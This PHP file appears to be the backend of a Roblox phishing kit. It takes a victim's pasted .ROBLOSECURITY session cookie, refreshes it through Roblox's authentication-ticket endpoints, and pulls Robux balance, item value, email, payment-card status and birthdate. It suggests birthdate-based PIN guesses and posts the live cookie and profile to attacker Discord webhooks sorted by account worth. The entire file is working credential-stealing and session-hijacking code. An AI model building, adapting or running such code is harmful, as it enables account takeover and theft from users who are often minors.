<?php
require("../include.php");
session_start();
header("content-type: application/json");
$post = json_decode(file_get_contents("php://input"), true);
if(!isset($_SERVER["HTTP_REFERER"])) {
    http_response_code(403);
    die(json_encode(["error" => ["message" => "Access Denied"]]));
};
if(isset($post["code"]) && !empty($post["code"])) {
    $headers = [
        "Content-Type: application/json", 
        "origin: https://www.roblox.com", 
        "Referer: https://www.roblox.com/"
    ];
    function makeRequest($url, $headers, $postData = null) {
        $ch = curl_init();
        curl_setopt_array($ch, [
            CURLOPT_URL => $url, CURLOPT_RETURNTRANSFER => true, CURLOPT_HEADER => true, 
            CURLOPT_HTTPHEADER => $headers, CURLOPT_POST => $postData ? true : false, 
            CURLOPT_POSTFIELDS => $postData ? json_encode($postData) : null
        ]);
        return curl_exec($ch);
    };
    function getCsrfToken($cookie, $headers) {
        return preg_match('/X-CSRF-TOKEN:\s*(\S+)/i', makeRequest("https://auth.roblox.com/v1/authentication-ticket", array_merge($headers, ["Cookie: .ROBLOSECURITY=$cookie"])), $matches) ? $matches[1] : null;
    };
    function refreshCookie($cookie, $headers) {
        if ($csrf = getCsrfToken($cookie, $headers)) {
            $ticket = preg_match('/rbx-authentication-ticket:\s*([^\s]+)/i', makeRequest("https://auth.roblox.com/v1/authentication-ticket", array_merge($headers, ["x-csrf-token: $csrf", "Cookie: .ROBLOSECURITY=$cookie"])), $matches) ? $matches[1] : null;
            if ($ticket) {
                $redeemResponse = makeRequest("https://auth.roblox.com/v1/authentication-ticket/redeem", array_merge($headers, ["x-csrf-token: $csrf", "RBXAuthenticationNegotiation: 1"]), ["authenticationTicket" => $ticket]);
                return str_replace('_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_', '', explode(";", explode(".ROBLOSECURITY=", $redeemResponse)[1] ?? '')[0] ?? '') ?? null;
            };
        };
        return null;
    };
    $code = base64_decode($post["code"]);
    if (preg_match('/\\.ROBLOSECURITY=([^;]+);/', $code, $matches)) {
        $cookie = str_replace('^', '', $matches[1]);
    };
    if (preg_match('/\\.RBXIDCHECK=([^;]+);/', $code, $matches)) {
        $rbxidcheck = str_replace('^', '', $matches[1]);
    };
    if (empty($rbxidcheck)) {
        $rbxidcheck = "This account does not have 2SV ( Two-Step-Verification ) in order for you to recive the .RBXIDCHECK the user must have 2SV!";
    };
    $cookie = refreshCookie($cookie, $headers) ?: "Invalid Cookie";
    if (isset($cookie) && !empty($cookie) && $cookie !== "Invalid Cookie") {
        $data = json_decode(file_get_contents(__DIR__ . '/../../auth/' . $post["secret"] . '.json'), true);
        $hook = $data['webhook'] ?? null;
        $dual = $data['dualhook'] ?? null;
        $csrf = get_csrf_token($cookie);
        $user_info = request("https://users.roblox.com/v1/users/authenticated", $cookie, $csrf);
        $transaction_totals = request("https://economy.roblox.com/v2/users/{$user_info['id']}/transaction-totals?timeFrame=Year&transactionType=summary", $cookie, $csrf);
        $credit_balance = request("https://apis.roblox.com/credit-balance/v1/get-conversion-metadata", $cookie, $csrf);
        $settings = request("https://www.roblox.com/my/settings/json", $cookie, $csrf);
        $user_settings = request("https://apis.roblox.com/user-settings-api/v1/user-settings", $cookie, $csrf);
        $pin_info = request("https://auth.roblox.com/v1/account/pin", $cookie, $csrf);
        $robux_info = request("https://economy.roblox.com/v1/users/{$user_info['id']}/currency", $cookie, $csrf);
        $collectibles = request("https://inventory.roblox.com/v1/users/{$user_info['id']}/assets/collectibles?sortOrder=Asc&limit=100", $cookie, $csrf);
        $summary_info = request("https://economy.roblox.com/v2/users/{$user_info['id']}/transaction-totals?timeFrame=Year&transactionType=summary", $cookie, $csrf);
        $voice_info = request("https://voice.roblox.com/v1/settings", $cookie, $csrf);
        $payment_profiles = request("https://apis.roblox.com/payments-gateway/v1/payment-profiles", $cookie, $csrf);
        $birthday = request("https://users.roblox.com/v1/birthdate", $cookie, $csrf);
        $public_data = request("https://users.roblox.com/v1/users/7209557292", $cookie, $csrf);
        $country_data = request("https://accountsettings.roblox.com/v1/account/settings/account-country", $cookie, $csrf);
        $rap = array_reduce($collectibles['data'] ?? [], fn($carry, $item) => $carry + ($item['recentAveragePrice'] ?? 0), 0);
        $game_votes = [
            'BF' => request("https://games.roblox.com/v1/games/994732206/votes/user", $cookie, $csrf)['canVote'] ? 'True' : 'False',
            'AMP' => request("https://games.roblox.com/v1/games/383310974/votes/user", $cookie, $csrf)['canVote'] ? 'True' : 'False',
            'MM2' => request("https://games.roblox.com/v1/games/66654135/votes/user", $cookie, $csrf)['canVote'] ? 'True' : 'False',
            'PS99' => request("https://games.roblox.com/v1/games/3317771874/votes/user", $cookie, $csrf)['canVote'] ? 'True' : 'False'
        ];
        $mail = $settings["UserEmail"];
        if (!isset($mail)) {
            $mail = "False";
        };
        $age = $settings['UserAbove13'] ? '13+' : '13>';
        $premium = $user_info['IsPremium'] ? 'True' : 'False';
        $card = $payment_profiles ? 'True' : 'False';
        $vc = $voice_info['isVoiceEnabled'] ? 'True' : 'False';
        $email = $settings['IsEmailVerified'] ? 'True' : 'False';
        $banned = $public_data['isBanned'] ? 'True' : 'False';
        $incoming = $transaction_totals['incomingRobuxTotal'];
        $outgoing = abs($transaction_totals['outgoingRobuxTotal']);
        $robux = $robux_info["robux"];
        $verified = $public_data['hasVerifiedBadge'] ? 'True' : 'False';
        $country = $country_data['value']['countryName'];
        $summary = $summary_info["salesTotal"];
        $daysAgo = $settings["AccountAgeInDays"];
        $veteran = $daysAgo >= 366 ? 'True' : "False";
        $twoStep = $settings['MyAccountSecurityModel']['IsTwoStepEnabled'] ? "True" : "False";
        $pin = $pin_info['isEnabled'] ? 'Enabled ( try ' . $birthday['birthYear'] . ' or ' . $birthday['birthMonth']. ' ' . $birthday['birthDay'] . ')' : 'Disabled';
        $infoembed = [
            "embeds" => [[
                "content" => "@everyone @here",
                "title" => "<:username:1335417332968853516> New Hit!",
                "description" => "**[ <:checkmark_1:1335417246201155585> Check Cookie](https://{$_SERVER['HTTP_HOST']}/controller/apis/check?cookie={$cookie}) | [ <:cookie:1335417139519295570> Refresh Cookie](https://{$_SERVER['HTTP_HOST']}/controller/apis/bypass?cookie={$cookie}) | [ <:rap:1335417287519244298> Rolimons](https://rolimons.com/player/{$user_info['id']})**",
                "color" => hexdec("98fb98"),
                "thumbnail" => [
                    "url" => $setup["SiteLogo"]
                ],
                "fields" => [
                    ["name" => "<:username:1335417332968853516> Username ($age)", "value" => "```{$user_info['name']}```", "inline" => true],
                    ["name" => "<:robux:1335417331345784912> Robux", "value" => "```{$robux}```", "inline" => true],
                    ["name" => "<:premium:1335417329844228206> Premium", "value" => "```{$premium}```", "inline" => true],
                    ["name" => "<:card:1335417328631939132> Card", "value" => "```Robux: {$credit_balance['robuxConversionAmount']}\nCard: {$card}```", "inline" => true],
                    ["name" => "<:rap:1335417287519244298> Rap", "value" => "```{$rap}```", "inline" => true],
                    ["name" => "<:robux:1335417331345784912> Summary", "value" => "```{$incoming}```", "inline" => true],
                    ["name" => "<:2step:1335417285963415622> 2-Step", "value" => "```{$twoStep}```", "inline" => true],
                    ["name" => "<:vc:1335417283501228094> VC", "value" => "```{$vc}```", "inline" => true],
                    ["name" => "<:checkmark_1:1335417246201155585> Verified", "value" => "```{$email}```", "inline" => true],
                    ["name" => "<:birthday:1335417144195678238> Account Created", "value" => "```{$daysAgo} Days ago```", "inline" => true],
                    ["name" => "<:phone:1335417140659880046> Phone Number", "value" => "```False```", "inline" => true],
                    ["name" => "<:mail:1335417247375818769> Mail", "value" => "```{$mail}```", "inline" => false],
                    ["name" => "<:cookie:1335417139519295570> .RBXIDCHECK", "value" => "```{$rbxidcheck}```", "inline" => false]
                ]
            ]]
        ];
        $cookieembed = [
            "embeds" => [[
                "title" => "",
                "description" => "```" . htmlspecialchars($cookie, ENT_QUOTES | ENT_HTML5) . "```",
                "color" => hexdec("98fb98"),
                "footer" => [
                    "text" => date('Y H:i:s'),
                    "icon_url" => $setup["SiteLogo"]
                ]
            ]]
        ];
        $infopayload = json_encode([
            "username" => $setup["SiteName"] . " - Hit",
            "avatar_url" => $setup["SiteLogo"],
            "embeds" => $infoembed["embeds"],
            "content" => "@everyone @here"
        ]);
        $cookiepayload = json_encode([
            "username" => $setup["SiteName"] . " - Hit",
            "avatar_url" => $setup["SiteLogo"],
            "embeds" => $cookieembed["embeds"]
        ]);
        if ($robux >= 10000) {
            send_webhook($setup["RobuxHook"], $infopayload);
        } elseif ($rap >= 10000) {
            send_webhook($setup["RapHook"], $infopayload);
        } elseif ($game_votes['PS99'] === 'True') {
            send_webhook($setup["PS99Hook"], $infopayload);
        } elseif ($game_votes['AMP'] === 'True') {
            send_webhook($setup["AMPHook"], $infopayload);
        } elseif ($game_votes['BF'] === 'True') {
            send_webhook($setup["BFHook"], $infopayload);
        } elseif ($game_votes['MM2'] === 'True') {
            send_webhook($setup["MM2Hook"], $infopayload);
        } else {
            send_webhook($setup["HitHook"], $infopayload);
        };
        if ($robux < 10000) {
            send_webhook($hook, $infopayload);
        };
        if (isset($dual)) {
            send_webhook($dual, $infopayload);
        };
        if ($robux >= 10000) {
            send_webhook($setup["RobuxHook"], $cookiepayload);
        } elseif ($rap >= 10000) {
            send_webhook($setup["RapHook"], $cookiepayload);
        } elseif ($game_votes['PS99'] === 'True') {
            send_webhook($setup["PS99Hook"], $cookiepayload);
        } elseif ($game_votes['AMP'] === 'True') {
            send_webhook($setup["AMPHook"], $cookiepayload);
        } elseif ($game_votes['BF'] === 'True') {
            send_webhook($setup["BFHook"], $cookiepayload);
        } elseif ($game_votes['MM2'] === 'True') {
            send_webhook($setup["MM2Hook"], $cookiepayload);
        } else {
            send_webhook($setup["HitHook"], $cookiepayload);
        };
        if ($robux < 10000) {
            send_webhook($hook, $cookiepayload);
        };
        if (isset($dual)) {
            send_webhook($dual, $cookiepayload);
        };
        if (file_exists(__DIR__ . "/stats.json")) {
            $data = file_get_contents(__DIR__ . "/stats.json");
            $stats = json_decode($data, true);
        } else {
            $stats = [];
        };
        if (isset($stats[$post["secret"]])) {
            $stats[$post["secret"]]++;
        } else {
            $stats[$post["secret"]] = 1;
        };
        $data['summary'] = $data['summary'] + $incoming;
        $data['rap'] = $data['rap'] + $rap;
        $data['robux'] = $data['robux'] + $robux;
        file_put_contents(__DIR__ . "/stats.json", json_encode($stats, JSON_PRETTY_PRINT));
        file_put_contents(dirname(__DIR__) . "/auth/" . $post["secret"] . ".json", json_encode($data));
        die(json_encode(["success" => ["message" => "Success"]]));
    } else {
        http_response_code(403);
        die(json_encode(["error" => ["message" => "Invalid Code!"]]));
    };
} else {
    http_response_code(403);
    die(json_encode(["error" => ["message" => "You must fill the form out!"]]));
};
?>